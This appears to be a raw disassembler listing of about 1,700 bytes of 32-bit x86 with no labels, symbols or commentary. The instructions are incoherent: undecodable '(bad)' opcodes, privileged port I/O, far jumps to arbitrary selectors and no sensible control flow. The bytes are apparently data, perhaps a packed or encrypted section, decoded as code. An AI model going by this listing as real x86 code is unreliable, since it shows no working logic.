  40ecde:	mov    dh,BYTE PTR [eax+0x714c12f1]
  40ece4:	aaa    
  40ece5:	pop    ds
  40ece6:	xchg   ebp,eax
  40ece7:	push   ecx
  40ece8:	dec    edi
  40ece9:	out    dx,eax
  40ecea:	cmp    ecx,DWORD PTR [edi-0x40]
  40eced:	fst    QWORD PTR [ebx-0x8]
  40ecf0:	adc    DWORD PTR [edx-0x3f],ebx
  40ecf3:	mov    al,ss:0xab540426
  40ecf9:	bnd jmp 0x40ecc2
  40ecfc:	ret    0xd9d2
  40ecff:	jmp    0x7e211370
  40ed04:	int    0x12
  40ed06:	or     DWORD PTR [ebx+0x32],ebp
  40ed09:	jle    0x40ecd2
  40ed0b:	ja     0x40ed5c
  40ed0d:	sbb    al,0x5d
  40ed0f:	xchg   ecx,eax
  40ed10:	pop    ebx
  40ed11:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed13:	jb     0x40ece9
  40ed15:	ss dec ebx
  40ed17:	cdq    
  40ed18:	aad    0x68
  40ed1a:	imul   eax,edx,0xffffff80
  40ed1d:	mov    esi,0x52a2bd81
  40ed22:	sub    al,0x8f
  40ed24:	cli    
  40ed25:	or     al,0x37
  40ed27:	xchg   ecx,eax
  40ed28:	or     bh,BYTE PTR ds:0x3e9d094e
  40ed2e:	xlat   BYTE PTR ds:[ebx]
  40ed2f:	leave  
  40ed30:	in     al,dx
  40ed31:	cmp    cl,BYTE PTR [edi-0x330ba51]
  40ed37:	adc    BYTE PTR [eax],dl
  40ed39:	lock fimul DWORD PTR [ebp-0x64]
  40ed3d:	repnz mov ds:0x360dca40,al
  40ed43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed44:	les    edi,FWORD PTR [edx+edx*1+0x4b1c583b]
  40ed4b:	xchg   BYTE PTR [edx+0x32],al
  40ed4e:	nop
  40ed4f:	(bad)  
  40ed50:	popf   
  40ed51:	sahf   
  40ed52:	jl     0x40ed1e
  40ed54:	lods   al,BYTE PTR ds:[esi]
  40ed55:	adc    eax,0x460f9c4b
  40ed5a:	mov    dl,0xb5
  40ed5c:	mov    ebx,0x8f80bd4b
  40ed61:	ins    DWORD PTR es:[edi],dx
  40ed62:	js     0x40ed36
  40ed64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed65:	scas   eax,DWORD PTR es:[edi]
  40ed66:	pushf  
  40ed67:	ja     0x40ed76
  40ed69:	jl     0x40ed27
  40ed6b:	in     al,0x39
  40ed6d:	retf   0xaff4
  40ed70:	sbb    esp,DWORD PTR ds:0x5a0588c4
  40ed76:	std    
  40ed77:	mov    bl,0x22
  40ed79:	jo     0x40ed40
  40ed7b:	popf   
  40ed7c:	inc    ebp
  40ed7d:	retfw  0x9e23
  40ed81:	and    ebp,ebp
  40ed83:	xchg   BYTE PTR [edx-0xa],bh
  40ed86:	mov    bh,0xb9
  40ed88:	push   ebx
  40ed89:	adc    ebx,DWORD PTR [ecx+0x6a]
  40ed8c:	stc    
  40ed8d:	(bad)  
  40ed8e:	loop   0x40ed74
  40ed90:	dec    ebp
  40ed91:	dec    ebx
  40ed92:	push   ebp
  40ed93:	dec    esi
  40ed94:	sub    ch,BYTE PTR [ebx]
  40ed96:	outs   dx,DWORD PTR ds:[esi]
  40ed97:	mov    esp,DWORD PTR [edi]
  40ed99:	jmp    0x40edc7
  40ed9b:	jns    0x40ed66
  40ed9d:	hlt    
  40ed9e:	push   es
  40ed9f:	test   eax,0xa09092b4
  40eda4:	push   es
  40eda5:	add    bl,BYTE PTR [esi]
  40eda7:	cdq    
  40eda8:	je     0x40ed30
  40edaa:	add    DWORD PTR [ebx-0x3a],ebp
  40edad:	inc    ebp
  40edae:	mov    esp,0xea722449
  40edb3:	add    edx,ebp
  40edb5:	out    0xdb,al
  40edb7:	std    
  40edb8:	pop    ecx
  40edb9:	aaa    
  40edba:	ss lds edx,FWORD PTR fs:[ebx+ebp*8+0x26f68e4d]
  40edc3:	repnz mov ah,0xeb
  40edc6:	arpl   WORD PTR [edi+0x42f1406b],cx
  40edcc:	ins    BYTE PTR es:[edi],dx
  40edcd:	pop    ebx
  40edce:	loopne 0x40ede9
  40edd0:	sub    BYTE PTR [ebp+0xf726663],cl
  40edd6:	xor    al,0x46
  40edd8:	push   es
  40edd9:	addr16 jo 0x40edd6
  40eddc:	mov    WORD PTR [edx-0x1c],?
  40eddf:	mov    ecx,esi
  40ede1:	fstp   QWORD PTR [ebx]
  40ede3:	push   ecx
  40ede4:	aas    
  40ede5:	icebp  
  40ede6:	sub    eax,0x9291b5da
  40edeb:	mov    DWORD PTR [eax-0x42],ecx
  40edee:	rol    DWORD PTR [ecx],cl
  40edf0:	ds repz push edi
  40edf3:	and    cl,dh
  40edf5:	in     eax,0xb7
  40edf7:	inc    ebx
  40edf8:	or     BYTE PTR [edx-0x2a],ah
  40edfb:	shl    BYTE PTR [eax-0x5d51fce3],cl
  40ee01:	mov    esp,0x60db0c3e
  40ee06:	dec    ebx
  40ee07:	push   edx
  40ee08:	ret    
  40ee09:	addr16 std 
  40ee0b:	(bad)  
  40ee0d:	bound  ebp,QWORD PTR [eax+0x57414080]
  40ee13:	aam    0x16
  40ee15:	push   esp
  40ee16:	iret   
  40ee17:	xchg   DWORD PTR [ebx+0x7f458b84],esi
  40ee1d:	add    DWORD PTR [edi+edi*4],edx
  40ee20:	cmp    DWORD PTR [ebx-0xf],0xfffffff1
  40ee24:	sbb    al,0xf7
  40ee26:	xchg   edi,eax
  40ee27:	pop    esp
  40ee28:	xor    al,BYTE PTR [eax+0x2c]
  40ee2b:	je     0x40ee37
  40ee2d:	xchg   ebx,eax
  40ee2e:	sbb    ebx,edi
  40ee30:	(bad)  
  40ee31:	out    dx,eax
  40ee32:	mov    DWORD PTR [eax-0x7a],esi
  40ee35:	pop    es
  40ee36:	and    DWORD PTR [edx],edi
  40ee38:	test   al,0x43
  40ee3a:	(bad)  
  40ee3b:	(bad)  
  40ee3c:	cmc    
  40ee3d:	mov    ah,0xbc
  40ee3f:	dec    eax
  40ee40:	dec    edx
  40ee41:	mov    eax,0x92cd4cbd
  40ee46:	dec    esi
  40ee47:	into   
  40ee48:	dec    edi
  40ee49:	ficomp DWORD PTR [ebp+0xb]
  40ee4c:	adc    BYTE PTR [ecx+0x62],bh
  40ee4f:	idiv   edi
  40ee51:	retf   0x97d6
  40ee54:	jbe    0x40edee
  40ee56:	push   edx
  40ee57:	xlat   BYTE PTR ds:[ebx]
  40ee58:	scas   eax,DWORD PTR es:[edi]
  40ee59:	push   cs
  40ee5a:	push   es
  40ee5b:	jge    0x40ee17
  40ee5d:	and    eax,0x2f8f5479
  40ee62:	cmp    esp,DWORD PTR [ecx+0x1f]
  40ee65:	and    BYTE PTR [ecx-0x5f8c102],bl
  40ee6b:	mov    esi,ss
  40ee6d:	xor    edx,DWORD PTR [edi]
  40ee6f:	loope  0x40eed1
  40ee71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee72:	repz xchg bp,ax
  40ee75:	xchg   ebx,eax
  40ee76:	test   BYTE PTR [ebp-0x4d],cl
  40ee79:	out    dx,al
  40ee7a:	outs   dx,BYTE PTR ds:[esi]
  40ee7b:	mov    eax,0xd093401d
  40ee80:	add    al,0x64
  40ee82:	icebp  
  40ee83:	pop    edi
  40ee84:	mov    ds:0xca446a92,eax
  40ee89:	sbb    esi,DWORD PTR [edx+0x4efcb920]
  40ee8f:	mov    al,0x3e
  40ee91:	div    edi
  40ee93:	adc    al,dh
  40ee95:	(bad)  
  40ee96:	fisttp WORD PTR [edi-0x6af76670]
  40ee9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee9d:	push   0x539ab50a
  40eea2:	popf   
  40eea3:	test   DWORD PTR [ecx+edi*2-0x455545ae],ebx
  40eeaa:	(bad)  
  40eeac:	push   eax
  40eead:	mov    esi,0x4da030bb
  40eeb2:	and    BYTE PTR [eax],bl
  40eeb4:	mov    bl,0xac
  40eeb6:	rol    DWORD PTR [eax+0x5],cl
  40eeb9:	xchg   esp,eax
  40eeba:	and    al,0xbe
  40eebc:	push   edi
  40eebd:	out    0x69,al
  40eebf:	(bad)  [ecx+esi*8+0x52]
  40eec3:	cmc    
  40eec4:	mov    DWORD PTR [esi-0x3],esi
  40eec7:	fcom   QWORD PTR [esi]
  40eec9:	ret    0x9574
  40eecc:	faddp  st(2),st
  40eece:	das    
  40eecf:	repnz leave 
  40eed1:	shl    bl,0x25
  40eed4:	xchg   esi,eax
  40eed5:	xchg   esi,eax
  40eed6:	xor    al,0x49
  40eed8:	rcl    DWORD PTR [ebp-0x7d],0xfa
  40eedc:	cmp    dl,BYTE PTR [ecx]
  40eede:	test   esi,0xc9131393
  40eee4:	mov    ds:0xabb433f0,eax
  40eee9:	pop    ss
  40eeea:	mov    cl,0x69
  40eeec:	jmp    0xbc212b13
  40eef1:	dec    ebx
  40eef2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eef3:	ds pop ebx
  40eef5:	add    eax,0x2d9d2d98
  40eefa:	sbb    al,0x63
  40eefc:	test   DWORD PTR [ebp+0x44729c27],edx
  40ef02:	stos   BYTE PTR es:[edi],al
  40ef03:	push   ss
  40ef04:	lock cmp edi,DWORD PTR [esi]
  40ef07:	and    DWORD PTR [eax+edi*2+0x75e4fcf2],ebx
  40ef0e:	call   0x6940:0x7e316a2e
  40ef15:	pop    es
  40ef16:	dec    ecx
  40ef17:	jns    0x40eea4
  40ef19:	xchg   esi,eax
  40ef1a:	bound  esp,QWORD PTR [ecx-0x6ce03b96]
  40ef20:	inc    eax
  40ef21:	or     eax,0x70157701
  40ef26:	lea    ecx,[edx-0x6082a17f]
  40ef2c:	push   ds
  40ef2d:	int3   
  40ef2e:	ins    BYTE PTR es:[edi],dx
  40ef2f:	jge    0x40eee9
  40ef31:	push   ecx
  40ef32:	xchg   edx,eax
  40ef33:	inc    esi
  40ef34:	lods   al,BYTE PTR ds:[esi]
  40ef35:	sub    DWORD PTR [esi-0x4a86ca0f],edx
  40ef3b:	ds dec esi
  40ef3d:	lea    edi,[edx]
  40ef3f:	push   ds
  40ef40:	pop    ecx
  40ef41:	cmp    ah,dl
  40ef43:	in     eax,dx
  40ef44:	push   ebp
  40ef45:	xchg   ebp,eax
  40ef46:	and    al,0xd1
  40ef48:	mov    ds:0x4cd50614,al
  40ef4d:	gs dec edx
  40ef4f:	(bad)  
  40ef50:	fmul   DWORD PTR [edx+0x64]
  40ef53:	xor    ah,ch
  40ef55:	xchg   DWORD PTR [esp+ebx*1],edx
  40ef58:	pop    DWORD PTR [edx-0x10]
  40ef5b:	or     BYTE PTR [ecx],bh
  40ef5d:	inc    ebp
  40ef5e:	mov    al,0x2a
  40ef60:	mov    esi,0xeb9495f4
  40ef65:	mov    dl,0x4a
  40ef67:	test   BYTE PTR [edi*2-0x213d07e4],bh
  40ef6e:	das    
  40ef6f:	ds dec esp
  40ef71:	iret   
  40ef72:	jmp    0x797:0x2feeeeb3
  40ef79:	mov    eax,ds:0x7b82596c
  40ef7e:	push   0xe7c8ef9d
  40ef83:	sub    ch,BYTE PTR [ebp-0x33b3b8ff]
  40ef89:	inc    esp
  40ef8a:	and    dl,dh
  40ef8c:	les    ebx,FWORD PTR [ecx-0x58fb5672]
  40ef92:	pop    edi
  40ef93:	in     eax,0xba
  40ef95:	scas   al,BYTE PTR es:[edi]
  40ef96:	xchg   edi,eax
  40ef97:	jmp    0x1271:0x896b119e
  40ef9e:	mov    DWORD PTR [edx],edi
  40efa0:	mov    eax,0xb6e669a8
  40efa5:	xor    al,0x8f
  40efa7:	mov    ecx,0x3a1f991
  40efac:	fidivr DWORD PTR [edi]
  40efae:	cdq    
  40efaf:	mov    ch,0x8c
  40efb1:	inc    ecx
  40efb2:	xchg   ecx,eax
  40efb3:	in     eax,dx
  40efb4:	mov    edi,0x2d4fc1ae
  40efb9:	test   ebp,ebp
  40efbb:	into   
  40efbc:	rcl    bh,cl
  40efbe:	sub    eax,0x51672881
  40efc3:	mov    cl,0xb0
  40efc5:	sbb    BYTE PTR [edx+0x254c8b24],0xa9
  40efcc:	fnsetpm(287 only) 
  40efce:	gs xchg edi,eax
  40efd0:	xor    al,0xe0
  40efd2:	scas   eax,DWORD PTR es:[edi]
  40efd3:	outs   dx,DWORD PTR ds:[esi]
  40efd4:	int    0x7f
  40efd6:	xlat   BYTE PTR ds:[ebx]
  40efd7:	or     al,0x8f
  40efd9:	das    
  40efda:	pop    ebp
  40efdb:	lds    ebx,FWORD PTR [ebx+0x58]
  40efde:	(bad)  
  40efdf:	into   
  40efe0:	pop    DWORD PTR [eax+0x22]
  40efe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efe4:	mov    ebx,0x6d0b586c
  40efe9:	lods   al,BYTE PTR ds:[esi]
  40efea:	add    BYTE PTR [ebx],0x4c
  40efed:	lock push ebx
  40efef:	adc    esi,esi
  40eff1:	dec    ecx
  40eff2:	(bad)  [eax+0x63]
  40eff5:	ficom  DWORD PTR [esi]
  40eff7:	xchg   edx,eax
  40eff8:	fdivp  st(0),st
  40effa:	fidiv  DWORD PTR ds:0xe3a1118d
  40f000:	int3   
  40f001:	repnz (bad) 
  40f003:	das    
  40f004:	out    dx,al
  40f005:	push   ss
  40f006:	call   0x2cd6203
  40f00b:	fs call 0x5862:0x40aa0d7
  40f013:	mov    bl,0x45
  40f015:	mov    WORD PTR [edx],es
  40f017:	and    al,BYTE PTR [edx+0x67]
  40f01a:	pop    esp
  40f01b:	mov    edx,0xf00d29aa
  40f020:	test   eax,0xbcfc39b8
  40f025:	pushf  
  40f026:	scas   al,BYTE PTR es:[edi]
  40f027:	and    al,bl
  40f029:	sub    dl,bl
  40f02b:	and    DWORD PTR [eax-0x5de4c532],eax
  40f031:	push   0x1b
  40f033:	scas   eax,DWORD PTR es:[edi]
  40f034:	push   ss
  40f035:	jl     0x40efcf
  40f037:	aas    
  40f038:	xchg   edx,eax
  40f039:	add    eax,edx
  40f03b:	sub    ecx,DWORD PTR [edi+0x62]
  40f03e:	xchg   BYTE PTR [ecx-0x3c],cl
  40f041:	push   esi
  40f042:	inc    esp
  40f043:	int3   
  40f044:	sahf   
  40f045:	aaa    
  40f046:	sub    BYTE PTR [edx],bl
  40f048:	pusha  
  40f049:	sahf   
  40f04a:	mul    DWORD PTR [ecx+0x29]
  40f04d:	xchg   ebp,eax
  40f04e:	aas    
  40f04f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f050:	fldcw  WORD PTR [eax-0x7b]
  40f053:	dec    esp
  40f054:	mov    edi,0xa728d9da
  40f059:	xchg   esp,eax
  40f05a:	add    ecx,esi
  40f05c:	gs inc esp
  40f05e:	stos   DWORD PTR es:[edi],eax
  40f05f:	add    eax,0xf45b6d13
  40f064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f065:	sbb    al,0x4d
  40f067:	dec    ecx
  40f068:	popa   
  40f069:	lods   al,BYTE PTR ds:[esi]
  40f06a:	aas    
  40f06b:	outs   dx,DWORD PTR ds:[esi]
  40f06c:	jmp    0x9961:0x5b0448ee
  40f073:	test   DWORD PTR [ecx],esp
  40f075:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f076:	arpl   WORD PTR [ebp-0x64480a64],dx
  40f07c:	sbb    eax,0x79fc4ea6
  40f081:	mov    ds:0x7b962ac3,al
  40f086:	mov    ?,WORD PTR [ecx]
  40f088:	push   DWORD PTR [edi-0x44676666]
  40f08e:	mov    esp,0xc5a31ccb
  40f093:	out    0xff,eax
  40f095:	js     0x40f0fb
  40f097:	into   
  40f098:	push   eax
  40f099:	stos   BYTE PTR es:[edi],al
  40f09a:	js     0x40f063
  40f09c:	lods   al,BYTE PTR ds:[esi]
  40f09d:	rol    bh,1
  40f09f:	retf   
  40f0a0:	pop    esi
  40f0a1:	loopne 0x40f122
  40f0a3:	pop    edx
  40f0a4:	mov    eax,ds:0xf4d07b16
  40f0a9:	mov    edx,0x18aedce5
  40f0ae:	jmp    0x40f0e2
  40f0b0:	push   cs
  40f0b1:	sbb    dl,BYTE PTR [esi+0x61483e1]
  40f0b7:	in     eax,dx
  40f0b8:	mov    eax,ds:0x3652e825
  40f0bd:	mov    ch,dh
  40f0bf:	push   esi
  40f0c0:	imul   ecx,DWORD PTR [esi],0x304c7d93
  40f0c6:	pop    ebx
  40f0c7:	cld    
  40f0c8:	mov    esp,0x58e86ad
  40f0cd:	sbb    al,0xdc
  40f0cf:	stos   DWORD PTR es:[edi],eax
  40f0d0:	pop    edx
  40f0d1:	or     DWORD PTR [edi],0x7db6bd44
  40f0d7:	loope  0x40f130
  40f0d9:	les    ebp,FWORD PTR [ecx-0x4a]
  40f0dc:	pop    ecx
  40f0dd:	nop    ebp
  40f0e0:	dec    edx
  40f0e1:	hlt    
  40f0e2:	(bad)  
  40f0e3:	cmc    
  40f0e4:	and    bl,dl
  40f0e6:	pop    eax
  40f0e7:	fprem1 
  40f0e9:	rol    BYTE PTR [ecx-0x1e3685c6],1
  40f0ef:	mov    esp,0xafd801ec
  40f0f4:	pop    edi
  40f0f5:	ds loop 0x40f0db
  40f0f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f0f9:	fwait
  40f0fa:	adc    bp,WORD PTR [ecx-0x462294fc]
  40f101:	sub    ebp,DWORD PTR [eax]
  40f103:	sub    ebx,0x23
  40f106:	sbb    edi,DWORD PTR [eax-0x2d03056d]
  40f10c:	ret    
  40f10d:	lock add ah,al
  40f110:	adc    eax,DWORD PTR [esi+0x75]
  40f113:	mov    ebx,0x2eb5717b
  40f118:	push   0xffffffe3
  40f11a:	inc    edx
  40f11b:	test   ebp,eax
  40f11d:	dec    ebp
  40f11e:	push   ds
  40f11f:	xchg   BYTE PTR [edx],ch
  40f121:	dec    BYTE PTR ds:0x12ab916f
  40f127:	pop    esp
  40f128:	data16 arpl WORD PTR [ebx-0x53e042b1],dx
  40f12f:	fucomp st(6)
  40f131:	pop    ds
  40f132:	cmp    ebx,ebx
  40f134:	cmp    BYTE PTR [bp+di],cl
  40f137:	neg    BYTE PTR [ebp+0x3fcdb063]
  40f13d:	js     0x40f0da
  40f13f:	push   ds
  40f140:	imul   ecx,DWORD PTR ds:0x7728ff08,0xd81f15ed
  40f14a:	mov    edi,0x7cdc2ff0
  40f14f:	and    esi,DWORD PTR [edi]
  40f151:	push   edi
  40f152:	adc    ch,bh
  40f154:	sub    eax,0x9e2b9c02
  40f159:	icebp  
  40f15a:	and    eax,esp
  40f15c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f15d:	mov    ch,0xf4
  40f15f:	fstp   TBYTE PTR [ebp+0x5f]
  40f162:	dec    DWORD PTR [edx+0x508faa4]
  40f168:	mov    al,ds:0x15f8747a
  40f16d:	pop    ebx
  40f16e:	add    esi,esp
  40f170:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f171:	out    0x9f,al
  40f173:	mov    dh,0x50
  40f175:	cwde   
  40f176:	ret    0x65fd
  40f179:	fisubr DWORD PTR [edx+ebp*8]
  40f17c:	stos   DWORD PTR es:[edi],eax
  40f17d:	cmp    esi,ebp
  40f17f:	into   
  40f180:	xor    edx,esi
  40f182:	(bad)  
  40f183:	cli    
  40f184:	loopne 0x40f19d
  40f186:	mov    ds:0x849efdb9,eax
  40f18b:	rcl    BYTE PTR [ecx+ebx*8+0x1c],0x49
  40f190:	push   ds
  40f191:	push   ecx
  40f192:	add    eax,0x89a86cb6
  40f197:	mov    bh,0x9e
  40f199:	push   ss
  40f19a:	out    0x76,ax
  40f19d:	mov    ds:0xf49319e2,eax
  40f1a2:	jno    0x40f160
  40f1a4:	scas   eax,DWORD PTR es:[edi]
  40f1a5:	aam    0xbf
  40f1a7:	sub    al,0xfe
  40f1a9:	pop    es
  40f1aa:	or     ebx,ebx
  40f1ac:	stos   DWORD PTR es:[edi],eax
  40f1ad:	pusha  
  40f1ae:	std    
  40f1af:	xchg   edi,eax
  40f1b0:	rol    ecx,cl
  40f1b2:	ja     0x40f1e3
  40f1b4:	or     eax,0xad2c8d16
  40f1b9:	adc    al,0x93
  40f1bb:	add    DWORD PTR [edi+0x24b67397],edi
  40f1c1:	mov    DWORD PTR [ebx+0x5af96118],ebx
  40f1c7:	pushaw 
  40f1c9:	sahf   
  40f1ca:	imul   eax,DWORD PTR ds:[ebx+0x2f],0xffffffa6
  40f1cf:	mov    edx,0x52fd4b0d
  40f1d4:	pop    edi
  40f1d5:	(bad)  
  40f1d6:	fmul   QWORD PTR [esp+ebx*1+0x101644a7]
  40f1dd:	mov    esi,0x21c200dd
  40f1e2:	or     al,0xc6
  40f1e4:	mov    esi,DWORD PTR [eax-0x71]
  40f1e7:	sub    al,ch
  40f1e9:	scas   eax,DWORD PTR es:[edi]
  40f1ea:	push   0x2e
  40f1ec:	xchg   ebp,eax
  40f1ed:	test   al,0x92
  40f1ef:	jae    0x40f1ad
  40f1f1:	cld    
  40f1f2:	ficom  DWORD PTR [esi+0x75c19c7d]
  40f1f8:	xor    BYTE PTR [ecx+0x5c1206f9],bh
  40f1fe:	sub    al,0x50
  40f200:	jge    0x40f1cf
  40f202:	jae    0x40f201
  40f204:	das    
  40f205:	add    esi,eax
  40f207:	jns    0x40f20e
  40f209:	cmp    esp,DWORD PTR [ebx-0x65]
  40f20c:	sbb    edi,DWORD PTR [esi]
  40f20e:	jb     0x40f23e
  40f210:	idiv   BYTE PTR [esi-0x5a5712ba]
  40f216:	popa   
  40f217:	div    BYTE PTR ds:0x9e2bbf59
  40f21d:	push   edx
  40f21e:	sbb    BYTE PTR [ebp+0x36],ah
  40f221:	lods   al,BYTE PTR ds:[esi]
  40f222:	xor    BYTE PTR [ecx],bh
  40f224:	in     eax,0x8e
  40f226:	cs push 0x6b
  40f229:	xchg   ebx,eax
  40f22a:	pop    ecx
  40f22b:	stos   DWORD PTR es:[edi],eax
  40f22c:	mov    ecx,0x927103d1
  40f231:	xor    eax,0x4bc8ec37
  40f236:	sahf   
  40f237:	or     edx,edi
  40f239:	xor    al,0xa0
  40f23b:	pop    ecx
  40f23c:	xor    esp,ebp
  40f23e:	neg    ch
  40f240:	and    ecx,DWORD PTR [edi+ebp*4]
  40f243:	mov    al,ds:0xf34452a1
  40f248:	cmc    
  40f249:	gs fs pop es
  40f24c:	adc    eax,0x2b3b398a
  40f251:	cs mov al,0xf2
  40f254:	jge    0x40f1fe
  40f256:	or     eax,0xcdf7c219
  40f25b:	xchg   esp,eax
  40f25c:	rcr    BYTE PTR [ecx],cl
  40f25e:	mov    al,0x98
  40f260:	mov    ds:0xa5e81151,eax
  40f265:	scas   eax,DWORD PTR es:[edi]
  40f266:	loopne 0x40f225
  40f268:	dec    edx
  40f269:	xor    al,0xd6
  40f26b:	fstp   TBYTE PTR [ebp-0x56586e16]
  40f271:	sbb    dl,BYTE PTR [ecx+ecx*4]
  40f274:	leave  
  40f275:	test   al,0x6e
  40f277:	aas    
  40f278:	fcom   QWORD PTR [eax+0xaa6686a]
  40f27e:	(bad)  
  40f280:	cld    
  40f281:	jbe    0x40f301
  40f283:	in     eax,dx
  40f284:	fwait
  40f285:	jle    0x40f2d1
  40f287:	sub    BYTE PTR [edx+0x62eaade],ch
  40f28d:	mov    ch,BYTE PTR [eax]
  40f28f:	sbb    bl,BYTE PTR [edi]
  40f291:	push   ecx
  40f292:	and    eax,0x29e39eb5
  40f297:	addr16 enter 0xc1b9,0xec
  40f29c:	outs   dx,DWORD PTR ds:[esi]
  40f29d:	sub    edx,edx
  40f29f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2a0:	dec    esp
  40f2a1:	xor    DWORD PTR [eax],ecx
  40f2a3:	in     al,0x0
  40f2a5:	push   esp
  40f2a6:	dec    eax
  40f2a7:	popf   
  40f2a8:	scas   al,BYTE PTR es:[edi]
  40f2a9:	jae    0x40f309
  40f2ab:	xchg   edi,eax
  40f2ac:	jmp    0xbedb:0xfe760e9f
  40f2b3:	dec    edi
  40f2b4:	iret   
  40f2b5:	dec    esp
  40f2b6:	sbb    BYTE PTR [ecx],al
  40f2b8:	dec    ebp
  40f2b9:	xor    eax,0xe88bca8e
  40f2be:	adc    ebx,edx
  40f2c0:	in     al,0x93
  40f2c2:	pop    ebp
  40f2c3:	aaa    
  40f2c4:	dec    ebx
  40f2c5:	mov    ch,0x49
  40f2c7:	cmp    ebp,eax
  40f2c9:	in     eax,0xb0
  40f2cb:	fwait
  40f2cc:	and    al,0xf4
  40f2ce:	aad    0xa
  40f2d0:	retf   0xe0b9
  40f2d3:	cmp    ebp,DWORD PTR [esp+eax*1-0x71]
  40f2d7:	pusha  
  40f2d8:	sbb    eax,0x3bd51077
  40f2dd:	cld    
  40f2de:	mov    ch,0xf7
  40f2e0:	mov    bl,0xed
  40f2e2:	pop    edx
  40f2e3:	dec    esp
  40f2e4:	or     cl,BYTE PTR [ecx]
  40f2e6:	(bad)  
  40f2e7:	popf   
  40f2e8:	mov    edi,0xd3d2cc86
  40f2ed:	out    dx,eax
  40f2ee:	lods   al,BYTE PTR ds:[esi]
  40f2ef:	jp     0x40f2de
  40f2f1:	ret    
  40f2f2:	enter  0x7d9,0xc
  40f2f6:	inc    ebx
  40f2f7:	ror    edi,1
  40f2f9:	push   esi
  40f2fa:	push   edi
  40f2fb:	sbb    BYTE PTR [esi+0x3e3b49b8],bh
  40f301:	push   edx
  40f302:	sub    eax,0x9404867f
  40f307:	mov    eax,0x41c8c34b
  40f30c:	out    0x91,al
  40f30e:	add    eax,0xa4206b80
  40f313:	std    
  40f314:	dec    esp
  40f315:	dec    edi
  40f316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f317:	mov    cl,0x6c
  40f319:	sbb    cl,cl
  40f31b:	cmp    al,0xe
  40f31d:	cmc    
  40f31e:	ret    
  40f31f:	outs   dx,DWORD PTR ds:[esi]
  40f320:	dec    edx
  40f321:	mov    dl,0xdd
  40f323:	pop    ebp
  40f324:	in     eax,dx
  40f325:	and    ecx,DWORD PTR [ebp+0x7c934f3e]
  40f32b:	arpl   WORD PTR [ebp+edi*2+0x27],si
  40f32f:	cmp    esp,ebx
  40f331:	repz dec edx
  40f333:	lods   eax,DWORD PTR ds:[esi]
  40f334:	push   ecx
  40f335:	and    eax,0xee1eefa7
  40f33a:	mov    dh,0x53
  40f33c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f33d:	pop    edx
  40f33e:	daa    
  40f33f:	fwait
  40f340:	enter  0x9a99,0x81
  40f344:	xor    bl,BYTE PTR [ebp+ebp*1+0xcdbbeb6]
  40f34b:	aam    0xd3
  40f34d:	sbb    BYTE PTR [ecx-0x452a7dcb],dh
  40f353:	mov    eax,0xc70d2d85
  40f358:	dec    ebp
  40f359:	cmc    
  40f35a:	je     0x40f342
  40f35c:	xchg   edx,eax
  40f35d:	lods   eax,DWORD PTR ds:[esi]
  40f35e:	lods   eax,DWORD PTR ds:[esi]
  40f35f:	in     al,0x40
  40f361:	mov    bl,0x62
  40f363:	sbb    BYTE PTR [ecx],dl
  40f365:	adc    BYTE PTR [edx],0x78
  40f368:	jmp    0xd341:0x415c104d
  40f36f:	sub    al,0x44
  40f371:	cwde   
  40f372:	rcl    al,0x5
  40f375:	xchg   DWORD PTR [ebp-0x42afdd70],ebp
  40f37b:	inc    edx
  40f37c:	or     al,0x79
  40f37e:	adc    BYTE PTR [ebx+0x67],ch
  40f381:	mov    cs,WORD PTR [esi]
  40f383:	jmp    FWORD PTR [edi-0x80]
  40f386:	or     edx,DWORD PTR [edi+edi*4-0x6e]
  40f38a:	xor    edx,DWORD PTR [eax]
  40f38c:	mov    eax,ds:0xfbd2e2cf
  40f391:	xlat   BYTE PTR ds:[ebx]
  40f392:	popa   
  40f393:	mov    dl,0x68
  40f395:	mov    ch,0x9b
  40f397:	pop    ecx
  40f398:	sub    eax,DWORD PTR [ebx+ebx*1+0x3d]
  40f39c:	mov    dh,dh
  40f39e:	aas    
  40f39f:	stos   BYTE PTR es:[edi],al
  40f3a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3a1:	sti    
  40f3a2:	xor    edx,DWORD PTR [edx]
  40f3a4:	stc    
  40f3a5:	out    0xf8,al
  40f3a7:	or     eax,0xd3813fc4
  40f3ac:	and    DWORD PTR [ecx-0x2c],esi
  40f3af:	jns    0x40f395
  40f3b1:	scas   al,BYTE PTR es:[edi]
  40f3b2:	adc    BYTE PTR [edx],dl
  40f3b4:	ror    BYTE PTR ss:[esi+0x1e],0xe7
  40f3b9:	xchg   esi,eax
  40f3ba:	ja     0x40f362
  40f3bc:	adc    DWORD PTR [edi+edi*8+0x6],edi
  40f3c0:	sti    
  40f3c1:	push   es
  40f3c2:	cmp    eax,0xf7cb9785
  40f3c7:	outs   dx,DWORD PTR ds:[esi]
  40f3c8:	jmp    0x40f408
  40f3ca:	push   ecx
  40f3cb:	loop   0x40f3c7
  40f3cd:	ror    DWORD PTR [ebp+0x2c],0x11
  40f3d1:	dec    ecx
  40f3d2:	sbb    dh,BYTE PTR [esi]
  40f3d4:	mov    cl,0xf5
  40f3d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3d7:	and    al,ah
  40f3d9:	xchg   DWORD PTR [eax],edx
  40f3db:	xchg   edx,eax
  40f3dc:	call   0xd61c6664
  40f3e1:	jbe    0x40f376
  40f3e3:	pushf  
  40f3e4:	push   es
  40f3e5:	add    BYTE PTR [eax+edi*1+0x27],dl
  40f3e9:	pop    eax
  40f3ea:	leave  
  40f3eb:	sbb    al,0xc7
  40f3ed:	and    esi,esp
